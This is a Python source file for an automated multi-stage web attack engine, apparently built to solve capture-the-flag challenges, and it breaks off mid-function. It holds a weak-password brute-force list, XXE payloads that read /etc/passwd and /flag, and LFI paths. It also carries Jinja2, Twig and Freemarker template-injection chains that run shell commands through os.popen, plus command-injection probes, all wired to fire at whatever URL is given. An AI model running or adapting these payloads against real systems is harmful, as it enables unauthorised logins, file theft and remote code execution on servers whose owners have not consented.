# -*- coding: utf-8 -*-
"""
Yang-Web v3.6 Multi-Stage Attack Engine
========================================
通用多阶段解题引擎 — 自动发现+利用攻击链，覆盖多种题型

架构:
  阶段检测 → 攻击 → 响应分析 → 跳转追踪 → 下一阶段 → ... → Flag

支持场景:
  1. 弱口令登录 → 后台利用 (SQLi/XXE/LFI/...)
  2. JS重定向追踪 → 自动跟随
  3. 多页面爬虫 → 表单识别 → 自动分类攻击
  4. Cookie/Session 保持 → 跨阶段上下文传递
  5. 响应模式识别 → 自动识别下一阶段漏洞类型
"""
from __future__ import annotations

import re
import ssl
import time
import json
import base64
import urllib.request
import urllib.error
import urllib.parse
from urllib.parse import urljoin
import http.cookiejar
from typing import Dict, List, Optional, Tuple, Set, Callable
from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError as FuturesTimeoutError


# ═══════════════════════════════════════════════════════════
#  Built-in Payload Libraries
# ═══════════════════════════════════════════════════════════

# Top 50 常见弱口令
COMMON_CREDENTIALS = [
    ("admin", "admin"), ("admin", "admin123"), ("admin", "123456"),
    ("admin", "password"), ("admin", "admin888"), ("admin", "12345678"),
    ("admin", "passwd"), ("admin", "pass"), ("admin", "123"),
    ("admin", ""), ("", ""),
    ("root", "root"), ("root", "123456"), ("root", "admin"),
    ("test", "test"), ("test", "123456"), ("test", "admin"),
    ("guest", "guest"), ("guest", "123456"),
    ("user", "user"), ("user", "123456"),
    ("admin", "admin@123"), ("admin", "Admin"), ("admin", "ADMIN"),
    ("admin", "qwerty"), ("admin", "abc123"), ("admin", "letmein"),
    ("admin", "monkey"), ("admin", "master"), ("admin", "dragon"),
    ("admin", "iloveyou"), ("admin", "trustno1"), ("admin", "111111"),
    ("admin", "654321"), ("admin", "888888"), ("admin", "000000"),
    ("admin", "P@ssw0rd"), ("admin", "Admin123"),
]

# JS 重定向模式
JS_REDIRECT_RE = [
    r"location\.href\s*=\s*['\"]([^'\"]+)['\"]",
    r"window\.location\s*=\s*['\"]([^'\"]+)['\"]",
    r"location\.replace\s*\(\s*['\"]([^'\"]+)['\"]",
    r"self\.location\s*=\s*['\"]([^'\"]+)['\"]",
    r"top\.location\s*=\s*['\"]([^'\"]+)['\"]",
    r"document\.location\s*=\s*['\"]([^'\"]+)['\"]",
]

# XXE payload 套件
XXE_PAYLOADS = {
    "read_flag": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<root><msg>&xxe;</msg></root>''',

    "read_flag_txt": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<root><msg>&xxe;</msg></root>''',

    "read_etc_passwd": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><msg>&xxe;</msg></root>''',

    "php_filter_flag": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag">
]>
<root><msg>&xxe;</msg></root>''',

    "directory_scan": '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><msg>&xxe;</msg></root>''',
}

# LFI payload — 登录后常见
LFI_PAYLOADS = [
    "/etc/passwd", "/flag", "/flag.txt", "/var/www/html/flag",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=flag.php",
    "../../../../etc/passwd", "....//....//etc/passwd",
]

# 页面类型指纹
PAGE_FINGERPRINTS = {
    "login": {
        "keywords": ["login", "登录", "signin", "sign in", "auth", "account"],
        "forms": [{"inputs": ["username", "password"]}, {"inputs": ["user", "pass"]},
                  {"inputs": ["name", "pwd"]}, {"inputs": ["email", "password"]}],
        "next_stage": "credential_brute",
    },
    "xxe": {
        "keywords": ["xxe", "xml", "entity"],
        "inputs": ["xml", "data", "payload"],
        "content_types": ["application/xml", "text/xml"],
        "next_stage": "xxe_attack",
    },
    "ssti": {
        "keywords": ["template", "ssti", "render", "view"],
        "inputs": ["template", "tpl", "view", "name", "msg", "input"],
        "next_stage": "ssti_attack",
    },
    "command": {
        "keywords": ["exec", "command", "cmd", "shell", "ping", "rce"],
        "inputs": ["cmd", "command", "exec", "ip", "host", "target"],
        "next_stage": "rce_attack",
    },
    "upload": {
        "keywords": ["upload", "file", "图片", "image", "avatar"],
        "inputs": ["file", "upload", "image"],
        "next_stage": "upload_attack",
    },
    "search": {
        "keywords": ["search", "搜索", "query", "find", "filter"],
        "inputs": ["s", "q", "search", "query", "keyword"],
        "next_stage": "sqli_xss_attack",
    },
    "flag_display": {
        "keywords": ["flag", "your flag", "congrat", "welcome"],
        "is_terminal": True,
    },
}


# ═══════════════════════════════════════════════════════════
#  HTTP Client with Session Support
# ═══════════════════════════════════════════════════════════

_SSL_CTX = ssl.create_default_context()
_SSL_CTX.check_hostname = False
_SSL_CTX.verify_mode = ssl.CERT_NONE

DEFAULT_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Yang-Web-MultiStage/3.6'

FLAG_RE = re.compile(
    r'(?:flag|ctf|iscc|hctf|geesec|nssctf|0xGame|ddctf|realworld|n1ctf|suctf|wmctf|'
    r'dasctf|pico|tjctf|angstrom|dctf|ractf|zh3r0|inctf|darkctf|csictf|ritsec|'
    r'nactf|b01lers|kksctf|moectf|gactf|actf|starctf|ructf|plaidctf|defenit|'
    r'hitcon|balsn|asis|codegate|0ctf|tctf|wctf|hxp|hackthebox|csaw)'
    r'\{[^}]+\}', re.IGNORECASE
)


class SessionHTTP:
    """带 Cookie Session 的 HTTP 客户端."""

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.cj = http.cookiejar.CookieJar()
        # Create opener with custom SSL context for cookie handling
        https_handler = urllib.request.HTTPSHandler(context=_SSL_CTX)
        http_handler = urllib.request.HTTPHandler()
        cookie_handler = urllib.request.HTTPCookieProcessor(self.cj)
        self._opener = urllib.request.build_opener(https_handler, http_handler, cookie_handler)

    def request(self, url: str, method: str = "GET", data: bytes = None,
                headers: dict = None, timeout: int = None) -> dict:
        """发送 HTTP 请求，返回 {status, headers, body, body_bytes, body_len, ok, error}."""
        result = {"ok": False, "status": 0, "headers": {}, "body": "",
                  "body_bytes": b"", "body_len": 0, "error": None}
        h = {"User-Agent": DEFAULT_UA, "Accept": "*/*"}
        if headers:
            h.update(headers)
        if data and method == "POST" and "Content-Type" not in h:
            h["Content-Type"] = "application/x-www-form-urlencoded"
        try:
            req = urllib.request.Request(url, data=data, headers=h, method=method)
            start = time.time()
            resp = self._opener.open(req, timeout=timeout or self.timeout)
            body = resp.read()
            result.update({
                "ok": True, "status": resp.status,
                "headers": dict(resp.headers),
                "body": body.decode("utf-8", errors="replace"),
                "body_bytes": body, "body_len": len(body),
                "elapsed_ms": int((time.time() - start) * 1000),
            })
        except urllib.error.HTTPError as e:
            result["status"] = e.code
            result["headers"] = dict(e.headers)
            try:
                body = e.read()
                result["body"] = body.decode("utf-8", errors="replace")
                result["body_bytes"] = body
                result["body_len"] = len(body)
            except Exception:
                pass
            result["ok"] = True
        except Exception as e:
            result["error"] = str(e)
        return result

    @property
    def cookies(self) -> List[str]:
        return [f"{c.name}={c.value}" for c in self.cj]

    def cookie_str(self) -> str:
        return "; ".join(self.cookies)


# ═══════════════════════════════════════════════════════════
#  Page Analyzer — 自动识别页面类型
# ═══════════════════════════════════════════════════════════

class PageAnalyzer:
    """分析 HTTP 响应，识别页面类型、提取关键信息."""

    def __init__(self):
        pass

    def analyze(self, html: str, url: str = "", headers: dict = None) -> dict:
        """分析页面返回: {type, forms, inputs, redirects, flags, hints, is_terminal}."""
        result = {
            "type": "unknown",
            "forms": [],
            "inputs": [],
            "redirects": [],
            "flags": [],
            "hints": [],
            "is_terminal": False,
            "title": "",
        }

        if not html:
            return result

        # Flag 检测
        flags = FLAG_RE.findall(html)
        if flags:
            result["flags"] = flags
            result["hints"].append(f"Flag found in response: {flags[0]}")

        # 标题
        m = re.search(r"<title[^>]*>(.*?)</title>", html, re.I | re.S)
        if m:
            result["title"] = m.group(1).strip()[:80]

        # JS 重定向提取
        for pattern in JS_REDIRECT_RE:
            for match in re.findall(pattern, html, re.I):
                if match and match not in result["redirects"]:
                    result["redirects"].append(match)
                    result["hints"].append(f"JS redirect target: {match}")

        # HTML meta refresh 重定向
        for match in re.findall(r'<meta[^>]+http-equiv=["\']refresh["\'][^>]+url=([^\s"\'>]+)', html, re.I):
            if match and match not in result["redirects"]:
                result["redirects"].append(match)

        # 表单分析
        forms = re.findall(r'<form[^>]*>(.*?)</form>', html, re.I | re.S)
        for f_html in forms:
            form_info = {"action": "", "method": "POST", "inputs": [], "textarea": []}

            # action
            am = re.search(r'action\s*=\s*["\']([^"\']*)', f_html, re.I)
            if am:
                form_info["action"] = am.group(1)

            # method
            mm = re.search(r'method\s*=\s*["\'](\w+)', f_html, re.I)
            if mm:
                form_info["method"] = mm.group(1).upper()

            # inputs
            for nm in re.findall(r'<input[^>]*name\s*=\s*["\']([^"\']+)', f_html, re.I):
                form_info["inputs"].append(nm)

            # textareas
            for nm in re.findall(r'<textarea[^>]*name\s*=\s*["\']([^"\']+)', f_html, re.I):
                form_info["textarea"].append(nm)

            all_inputs = form_info["inputs"] + form_info["textarea"]
            if all_inputs:
                result["forms"].append(form_info)
                result["inputs"].extend(all_inputs)

        # 页面类型指纹匹配
        scores = {}
        html_lower = html.lower()
        for ptype, fingerprint in PAGE_FINGERPRINTS.items():
            score = 0
            # 关键词匹配
            for kw in fingerprint.get("keywords", []):
                if kw in html_lower:
                    score += 10
            # 表单匹配
            fdefs = fingerprint.get("forms", []) or fingerprint.get("inputs", [])
            if fdefs and result["forms"]:
                for form_data in result["forms"]:
                    form_inputs = form_data["inputs"] + form_data["textarea"]
                    for fdef in fdefs:
                        if isinstance(fdef, dict):
                            expected = fdef.get("inputs", [])
                            if expected and all(ei in form_inputs for ei in expected):
                                score += 25
                        elif isinstance(fdef, str) and fdef in form_inputs:
                            score += 15
            # content_types
            if "content_types" in fingerprint:
                ct = headers.get("Content-Type", "") if headers else ""
                for t in fingerprint["content_types"]:
                    if t in ct:
                        score += 10
            if score > 0:
                scores[ptype] = score

        if scores:
            result["type"] = max(scores, key=scores.get)
            if scores[result["type"]] < 20:
                result["type"] = "unknown"

        # 终端页面检测
        if result["type"] in PAGE_FINGERPRINTS and PAGE_FINGERPRINTS[result["type"]].get("is_terminal"):
            result["is_terminal"] = True

        # 错误/提示信息提取
        # PHP warnings
        for w in re.findall(r'<b>(Warning|Notice|Fatal error)</b>.*?<br', html, re.I):
            result["hints"].append(f"PHP: {w[:100]}")
        # alert messages
        for a in re.findall(r"alert\(['\"]([^'\"]+)['\"]", html, re.I):
            result["hints"].append(f"Alert: {a}")

        return result


# ═══════════════════════════════════════════════════════════
#  Multi-Stage Attack Engine
# ═══════════════════════════════════════════════════════════

class MultiStageEngine:
    """通用多阶段攻击引擎.

    管线:
      输入 URL → 爬取分析 → 识别阶段类型 → 对应攻击 → 跟随跳转 → ... → Flag
    """

    def __init__(self, timeout: int = 8, max_stages: int = 5):
        self.timeout = timeout
        self.max_stages = max_stages
        self.http = SessionHTTP(timeout=timeout)
        self.analyzer = PageAnalyzer()
        self.attack_log: List[dict] = []
        self._cancelled = False

    def cancel(self):
        self._cancelled = True

    def solve(self, url: str, on_progress=None, on_flag=None) -> dict:
        """主入口: 自动多阶段解题.

        Returns:
            {"success": bool, "flag": str|None, "stages": [...],
             "attack_log": [...], "timing_ms": int}
        """
        t0 = time.time()
        self._cancelled = False
        self._base_url = url
        self.attack_log = []
        found_flag = None

        def _emit(stage, item, status):
            if on_progress:
                try:
                    on_progress(stage, item, status)
                except Exception:
                    pass

        def _found(flag):
            nonlocal found_flag
            if not found_flag:
                found_flag = flag
                if on_flag:
                    try:
                        on_flag(flag)
                    except Exception:
                        pass

        _emit("multi", url, "🚀 启动多阶段自动解题...")

        current_url = url
        visited: Set[str] = set()

        for stage_num in range(1, self.max_stages + 1):
            if self._cancelled or found_flag:
                break

            # Step 1: 请求当前页面
            _emit("stage", f"第{stage_num}阶段", f"请求: {current_url[:60]}")
            if current_url in visited:
                _emit("stage", "循环检测", "URL 已访问过，跳过")
                break
            visited.add(current_url)

            resp = self.http.request(current_url)
            if resp["error"]:
                _emit("stage", "请求失败", resp["error"][:60])
                break

            body = resp["body"]
            headers = resp["headers"]

            # Step 1.5: 404/error on base URL → auto-discover common paths
            is_404 = resp["status"] in (404, 403) and stage_num == 1
            if is_404:
                # Quick check: is this a real 404 page?
                not_found_markers = ['404', 'not found', 'Not Found', 'Not Found']
                looks_404 = any(m in body for m in not_found_markers)
                has_forms = re.search(r'<form\b', body, re.I)
                if looks_404 and not has_forms:
                    _emit("stage", "入口404", "自动探测常见路径...")
                    discovered = self._discover_urls(current_url, _emit)
                    if discovered:
                        current_url = discovered[0]
                        resp = self.http.request(current_url)
                        if resp["error"]:
                            _emit("stage", "请求失败", resp["error"][:60])
                            break
                        body = resp["body"]
                        headers = resp["headers"]
                        _emit("redirect", current_url[:60], f"发现入口 ({len(discovered)}个)")
                        visited.add(current_url)  # Mark the discovered URL as visited
                    else:
                        _emit("stage", "路径终止", "404且无可用入口")
                        self.attack_log.append({"stage": 1, "url": current_url,
                            "type": "404", "attack": None, "result": "dead_end"})
                        break

            # Step 2: 分析页面
            analysis = self.analyzer.analyze(body, current_url, headers)
            page_type = analysis["type"]
            _emit("page_type", current_url[:50], f"识别: {page_type} | 标题: {analysis['title'][:30]}")

            # Flask/Werkzeug server → auto-upgrade to SSTI detection
            server = headers.get("Server", "")
            if page_type == "unknown" and ("Werkzeug" in server or "Flask" in server or "Python" in server):
                page_type = "ssti"
                _emit("page_type", "Flask detected", "auto-upgrade: SSTI")

            stage_record = {
                "stage": stage_num,
                "url": current_url,
                "type": page_type,
                "analysis": analysis,
                "attack": None,
                "result": None,
            }

            # Step 3: 检查 Flag
            if analysis["flags"]:
                _found(analysis["flags"][0])
                stage_record["result"] = "flag_found"
                self.attack_log.append(stage_record)
                break

            # Step 4: 终端页面检测
            if analysis["is_terminal"]:
                body_flag = FLAG_RE.search(body)
                if body_flag:
                    _found(body_flag.group(0))
                stage_record["result"] = "terminal"
                self.attack_log.append(stage_record)
                break

            # Step 5: 根据页面类型执行对应攻击
            next_stage_url = None

            if page_type == "login":
                next_stage_url = self._stage_login(current_url, resp, analysis, _emit, _found)

            elif page_type == "xxe":
                next_stage_url = self._stage_xxe(current_url, resp, analysis, _emit, _found)

            elif page_type in ("ssti", "unknown"):
                # SSTI: explicit match or fallback for unknown pages
                next_stage_url = self._stage_ssti(current_url, resp, analysis, _emit, _found)
                if not next_stage_url and page_type == "unknown":
                    next_stage_url = self._stage_generic(current_url, resp, analysis, _emit, _found)

            elif page_type == "command":
                next_stage_url = self._stage_rce(current_url, resp, analysis, _emit, _found)

            elif page_type in ("search",):
                # Search page → SQLi/XSS
                next_stage_url = self._stage_generic(current_url, resp, analysis, _emit, _found)

            else:
                _emit("stage", "未知类型", f"尝试通用攻击")

            # Step 6: 处理 JS 重定向
            if not next_stage_url and analysis["redirects"]:
                redirect = analysis["redirects"][0]
                if not redirect.startswith("http"):
                    redirect = urljoin(current_url, redirect)
                _emit("redirect", redirect[:60], "JS 重定向跟随")
                next_stage_url = redirect

            # Step 7: 页面内链接发现
            if not next_stage_url and not found_flag:
                links = re.findall(r'href\s*=\s*["\']([^"\']+)', body, re.I)
                unvisited = []
                for link in links[:20]:
                    if link.startswith("#") or link.startswith("javascript:"):
                        continue
                    full = urljoin(current_url, link)
                    if full not in visited and ".php" in full.lower():
                        unvisited.append(full)
                if unvisited:
                    next_stage_url = unvisited[0]
                    _emit("link", next_stage_url[:60], f"发现 {len(unvisited)} 个未访问链接")

            if next_stage_url:
                if next_stage_url in visited:
                    # Check if we've already visited, move to next unvisited
                    unvisited_links = [l for l in re.findall(r'href\s*=\s*["\']([^"\']+)', body, re.I) 
                                       if not l.startswith("#") and not l.startswith("javascript:")]
                    for link in unvisited_links:
                        full = urljoin(current_url, link)
                        if full not in visited:
                            next_stage_url = full
                            break
                    else:
                        next_stage_url = None  # All visited

            stage_record["result"] = "next_stage" if next_stage_url else "dead_end"
            self.attack_log.append(stage_record)

            if not next_stage_url:
                _emit("stage", "路径终止", "无更多可攻击阶段")
                break

            current_url = next_stage_url

        timing = int((time.time() - t0) * 1000)
        return {
            "success": bool(found_flag),
            "flag": found_flag,
            "attack_log": self.attack_log,
            "stages_count": len(self.attack_log),
            "timing_ms": timing,
        }

    # ── URL Discovery ──

    def _discover_urls(self, url: str, _emit) -> List[str]:
        """当基URL返回404时，自动探测常见入口路径."""
        common_paths = [
            '/login.php', '/login', '/index.php', '/admin',
            '/admin.php', '/register.php', '/register',
            '/api', '/api/v1', '/api/login', '/auth', '/auth/login',
            '/home', '/home.php', '/main', '/dashboard',
            '/flag.php', '/flag', '/secret', '/user',
            '/upload', '/upload.php', '/shell.php',
        ]
        found = []
        from urllib.parse import urlparse
        parsed = urlparse(url)

        for path in common_paths:
            if self._cancelled:
                break
            test_url = f"{parsed.scheme}://{parsed.netloc}{path}"
            resp = self.http.request(test_url)
            if resp["status"] in (200, 302, 301, 403):
                found.append(test_url)
                _emit("discover", path, f"status={resp['status']}")

        return found

    # ── Stage Handlers ──

    def _stage_login(self, url: str, resp: dict, analysis: dict,
                     _emit, _found) -> Optional[str]:
        """登录阶段: 弱口令爆破."""
        _emit("attack", "弱口令爆破", f"Top {min(20, len(COMMON_CREDENTIALS))} 凭据...")

        form_action = url
        if analysis["forms"]:
            first_form = analysis["forms"][0]
            if first_form["action"]:
                form_action = urljoin(url, first_form["action"])
            form_method = first_form.get("method", "POST")
            _emit("attack", "表单识别", f"method={form_method} action={form_action}")

        for username, password in COMMON_CREDENTIALS[:20]:
            if self._cancelled:
                break

            data = urllib.parse.urlencode({
                "username": username,
                "password": password,
            }).encode()

            resp2 = self.http.request(form_action, method="POST", data=data)
            body2 = resp2.get("body", "")

            # 判断登录成功
            fail_keywords = ["invalid", "wrong password", "密码错误", "用户名错误",
                           "incorrect", "login fail", "denied", "用户名或密码",
                           "not found", "doesn't exist"]
            success_keywords = ["successful", "成功", "welcome", "登录成功", "dashboard",
                               "congrat", "flag{", "你的flag", "your flag"]
            # 先检查失败标志
            body_lower = body2.lower()
            is_fail = any(kw in body_lower for kw in fail_keywords)
            # 再检查成功标志
            is_success = any(kw in body_lower for kw in success_keywords) or \
                         bool(re.search(r"(?:successful|成功|welcome|登录成功|dashboard)", body2, re.I))
            # 响应中缺少"Try to Login"(登录页标志)也可能是登录成功
            no_login_hint = "try to login" not in body_lower and "Invaild" not in body2
            # 长度显著变化(>100B)也可能是成功
            len_changed = abs(len(body2) - len(resp.get("body", ""))) > 100

            login_ok = (is_success or no_login_hint or len_changed) and not is_fail

            if login_ok:
                _emit("cred_found", f"{username}:{password}", "✅ 登录成功!")

                # 提取 JS 重定向
                analysis2 = self.analyzer.analyze(body2, form_action)
                if analysis2["redirects"]:
                    next_url = analysis2["redirects"][0]
                    if not next_url.startswith("http"):
                        next_url = urljoin(form_action, next_url)
                    _emit("redirect", next_url[:60], "登录后重定向")
                    return next_url

                # 检查 flag
                flag = FLAG_RE.search(body2)
                if flag:
                    _found(flag.group(0))
                    return None

                # 链接发现
                links = re.findall(r'href\s*=\s*["\']([^"\']+)', body2, re.I)
                for link in links:
                    if link not in ("#", "javascript:void(0)") and ".php" in link:
                        next_url = urljoin(form_action, link)
                        if next_url != url and next_url != form_action:
                            return next_url
                return None  # Login succeeded but no obvious next step

            # 如果 body 长度变化 > 50B，也可能是登录成功
            if abs(len(body2) - len(resp.get("body", ""))) > 50:
                _emit("cred_try", f"{username}:{password}",
                      f"len_diff={len(body2)-len(resp.get('body',''))}")

        _emit("attack", "弱口令爆破", "未找到有效凭据")
        return None

    def _stage_xxe(self, url: str, resp: dict, analysis: dict,
                   _emit, _found) -> Optional[str]:
        """XXE 阶段: 尝试读 /flag."""
        _emit("attack", "XXE 攻击", "尝试读取服务器文件...")

        for name, payload in XXE_PAYLOADS.items():
            if self._cancelled:
                break

            resp2 = self.http.request(url, method="POST",
                data=payload.encode(),
                headers={"Content-Type": "application/xml"})

            body2 = resp2.get("body", "")

            # Flag 检测
            flag = FLAG_RE.search(body2)
            if flag:
                _found(flag.group(0))
                _emit("xxe_hit", name, flag.group(0)[:40])
                return None

            # /etc/passwd 验证 XXE 是否生效
            if "root:x:" in body2:
                _emit("xxe_confirmed", name, "XXE 生效! /etc/passwd 可读")
                # 如果 XXE 生效但还没读到 flag，尝试 PHP filter
                resp3 = self.http.request(url, method="POST",
                    data=XXE_PAYLOADS["php_filter_flag"].encode(),
                    headers={"Content-Type": "application/xml"})
                body3 = resp3.get("body", "")
                flag2 = FLAG_RE.search(body3)
                if flag2:
                    _found(flag2.group(0))
                # 尝试 base64 解码
                b64 = re.search(r'[A-Za-z0-9+/=]{40,}', body3)
                if b64 and 'DOCTYPE' not in body3:
                    import base64
                    try:
                        decoded = base64.b64decode(b64.group(0)).decode()
                        flag3 = FLAG_RE.search(decoded)
                        if flag3:
                            _found(flag3.group(0))
                    except Exception:
                        pass
                return None

            # 检查响应是否不同于原始页面（XXE 可能有效但没有标准的文件内容）
            if len(body2) != resp.get("body_len", 0):
                _emit("xxe_test", name, f"响应长度变化: {len(body2)-resp.get('body_len',0)}B")

        return None

    def _stage_ssti(self, url: str, resp: dict, analysis: dict,
                    _emit, _found) -> Optional[str]:
        """SSTI 阶段: Jinja2/Twig/Freemarker 全面探测."""
        _emit("attack", "SSTI 全面探测", "Jinja2/Twig/Freemarker...")

        # 收集所有可能的注入点
        all_inputs = set(analysis.get("inputs", []))
        # 补全常见参数名
        all_inputs.update(["name", "input", "msg", "q", "s", "search", "query",
                          "data", "text", "value", "content", "page", "id", "cmd"])

        # Jinja2 探测载荷
        probes = [
            ("{{7*7}}", "49", False),
            ("${7*7}", "49", False),
            ("{{config}}", "<Config", False),
            ("{{request}}", "<Request", False),
            ("{{''.__class__}}", "str", False),
        ]

        # 对每个参数，尝试 GET 和 POST
        for probe_text, expect, is_flag in probes:
            if self._cancelled:
                break
            for param in sorted(all_inputs)[:15]:
                if self._cancelled:
                    break
                # GET test
                test_url = f"{url}{'&' if '?' in url else '?'}{param}={urllib.parse.quote(probe_text)}"
                resp2 = self.http.request(test_url)
                body2 = resp2.get("body", "")
                if expect in body2:
                    _emit("ssti_hit", param, f"{probe_text} -> {expect} detected!")
                    return self._ssti_exploit(url, resp, param, _emit, _found)

            # POST test on forms
            if analysis.get("forms"):
                for fdata in analysis["forms"]:
                    for param in fdata.get("inputs", []) + fdata.get("textarea", []):
                        if self._cancelled:
                            break
                        test_data = urllib.parse.urlencode({param: probe_text}).encode()
                        resp3 = self.http.request(url, method="POST", data=test_data)
                        body3 = resp3.get("body", "")
                        if expect in body3:
                            _emit("ssti_hit", f"POST/{param}", f"{probe_text} -> {expect} detected!")
                            return self._ssti_exploit(url, resp, param, _emit, _found)

        # JS API endpoint detection: find fetch()/xhr paths in page source
        js_endpoints = self._extract_api_endpoints(resp.get("body", ""), self._base_url)
        if js_endpoints and self._cancelled == False:
            _emit("ssti_hint", "JS endpoints", f"Found {len(js_endpoints)} API paths")
            for ep in js_endpoints[:5]:
                if self._cancelled:
                    break
                api_url = urljoin(self._base_url or url, ep)
                result = self._try_json_ssti(api_url, _emit, _found)
                if result:
                    return result

        return None

    def _ssti_exploit(self, url: str, resp: dict, param: str,
                      _emit, _found) -> Optional[str]:
        """SSTI 确认后尝试 RCE 读 Flag."""
        _emit("ssti_exploit", param, "尝试 RCE 链...")

        rce_payloads = [
            # Jinja2 - popen
            "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
            "{{cycler.__init__.__globals__.os.popen('cat /fla*').read()}}",
            "{{lipsum.__globals__.os.popen('cat /flag').read()}}",
            "{{lipsum.__globals__['os'].popen('cat /flag').read()}}",
            # Jinja2 - config-based
            "{{config.__init__.__globals__['os'].popen('cat /flag').read()}}",
            "{{config.items()}}",
            # Jinja2 - subprocess
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            # Jinja2 - eval
            "{{url_for.__globals__['current_app'].config}}",
            # Twig
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /flag')}}",
            # Freemarker
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /flag\")}",
        ]

        for rce in rce_payloads:
            if self._cancelled:
                break
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={urllib.parse.quote(rce)}"
            resp2 = self.http.request(test_url)
            body2 = resp2.get("body", "")
            flag = FLAG_RE.search(body2)
            if flag:
                _found(flag.group(0))
                return None
            # Also try POST
            test_data = urllib.parse.urlencode({param: rce}).encode()
            resp3 = self.http.request(url, method="POST", data=test_data)
            body3 = resp3.get("body", "")
            flag2 = FLAG_RE.search(body3)
            if flag2:
                _found(flag2.group(0))
                return None

        return None

    # ── JS API Endpoint Detection ──

    def _extract_api_endpoints(self, html: str, base_url: str = "") -> List[str]:
        """Extract fetch()/XMLHttpRequest API paths from JS in HTML."""
        endpoints = set()
        # First: find referenced JS files
        js_urls = []
        for m in re.findall(r'<script\s+src\s*=\s*["\']([^"\']+)["\']', html, re.I):
            if not m.startswith('http'):
                from urllib.parse import urljoin
                m = urljoin(base_url, m)
            js_urls.append(m)

        # Extract endpoints from inline JS + external JS
        for js_url in [None] + js_urls[:5]:  # None = inline HTML
            if self._cancelled:
                break
            source = html
            if js_url:
                resp = self.http.request(js_url)
                if resp.get("error") or resp.get("status", 0) != 200:
                    continue
                source = resp.get("body", "")
            for m in re.findall(r"fetch\s*\(\s*['\"]([^'\"]+)['\"]", source):
                endpoints.add(m)
            for m in re.findall(r"\.open\s*\(\s*['\"]\w+['\"]\s*,\s*['\"]([^'\"]+)['\"]", source):
                endpoints.add(m)
            for m in re.findall(r"axios\.(?:get|post|put|patch)\s*\(\s*['\"]([^'\"]+)['\"]", source):
                endpoints.add(m)
        return list(endpoints)

    def _try_json_ssti(self, api_url: str, _emit, _found) -> Optional[str]:
        """Try SSTI via JSON API with base64 awareness."""
        # Standard JSON SSTI
        probes = ["{{7*7}}", "{{config}}", "{{''.__class__}}"]
        for probe in probes:
            if self._cancelled:
                break
            payloads = []
            # Direct JSON in various key names
            for key in ("data", "name", "msg", "query", "value", "input",
                       "achilles_distance", "tortoise_distance", "key", "id"):
                payloads.append(json.dumps({key: probe}).encode())
            # Base64-wrapped pattern: JS encryptData style
            for key in ("data", "payload", "request", "body"):
                inner = json.dumps({key: probe}, separators=(',', ':'))
                b64 = base64.b64encode(inner.encode()).decode()
                payloads.append(json.dumps({"data": b64}).encode())
                payloads.append(json.dumps({"payload": b64}).encode())
            # Base64 with number + string (mixed fields pattern)
            inner_mixed = json.dumps({"achilles_distance": probe, "tortoise_distance": 100}, separators=(',', ':'))
            b64_m = base64.b64encode(inner_mixed.encode()).decode()
            payloads.append(json.dumps({"data": b64_m}).encode())
            for data in payloads:
                if self._cancelled:
                    break
                resp = self.http.request(api_url, method="POST", data=data,
                    headers={"Content-Type": "application/json"})
                body = resp.get("body", "")
                # Base64-decode response first (modern CTF pattern)
                decoded_bodies = [body]
                try:
                    resp_json = json.loads(body)
                    for key in ("data", "result", "response", "flag", "message"):
                        val = resp_json.get(key, "")
                        if isinstance(val, str):
                            try:
                                decoded = base64.b64decode(val).decode()
                                decoded_bodies.append(decoded)
                                flag = FLAG_RE.search(decoded)
                                if flag:
                                    _found(flag.group(0))
                                    return None
                            except Exception:
                                pass
                except Exception:
                    pass
                # Check decoded bodies for SSTI
                for db in decoded_bodies:
                    if "49" in db:
                        _emit("ssti_hit_json", api_url[-40:], f"{probe} -> 49!")
                        return self._ssti_json_rce(api_url, _emit, _found)
                    if "<Config" in db or "SECRET" in db:
                        _emit("ssti_hit_json", api_url[-40:], f"{probe} -> CONFIG leak!")
                        return None
        return None

    def _ssti_json_rce(self, api_url: str, _emit, _found) -> Optional[str]:
        """SSTI confirmed on JSON API — try RCE via standard + base64 paths."""
        _emit("ssti_exploit", "JSON API", "attempting RCE...")
        rce_list = [
            "{{lipsum.__globals__.os.popen('cat /flag').read()}}",
            "{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}",
            "{{config.__init__.__globals__['os'].popen('cat /flag').read()}}",
        ]
        for rce in rce_list:
            if self._cancelled:
                break
            # Standard JSON
            rce_data = json.dumps({"data": rce}).encode()
            resp = self.http.request(api_url, method="POST", data=rce_data,
                headers={"Content-Type": "application/json"})
            body = resp.get("body", "")
            # Base64 decode
            try:
                j = json.loads(body)
                for k in ("data", "result", "response", "flag"):
                    v = j.get(k, "")
                    if isinstance(v, str):
                        try:
                            d = base64.b64decode(v).decode()
                            f = FLAG_RE.search(d)
                            if f:
                                _found(f.group(0))
                                return None
                        except Exception:
                            pass
            except Exception:
                pass
            f = FLAG_RE.search(body)
            if f:
                _found(f.group(0))
                return None
        return None

    def _stage_rce(self, url: str, resp: dict, analysis: dict,
                   _emit, _found) -> Optional[str]:
        """RCE 阶段: 命令注入探测."""
        _emit("attack", "RCE 探测", "命令注入...")

        cmds = [
            "cat /flag", "cat /flag.txt", "cat /var/www/html/flag",
            "cat /fla*", "cat /f*", "tac /flag",
            "nl /flag", "head -n 50 /flag",
        ]

        for param in analysis.get("inputs", ["cmd", "command", "ip"]):
            if self._cancelled:
                break
            for cmd in cmds:
                test_url = f"{url}?{param}={urllib.parse.quote(cmd)}"
                resp2 = self.http.request(test_url)
                body2 = resp2.get("body", "")
                flag = FLAG_RE.search(body2)
                if flag:
                    _found(flag.group(0))
                    return None
                # RCE 成功标志
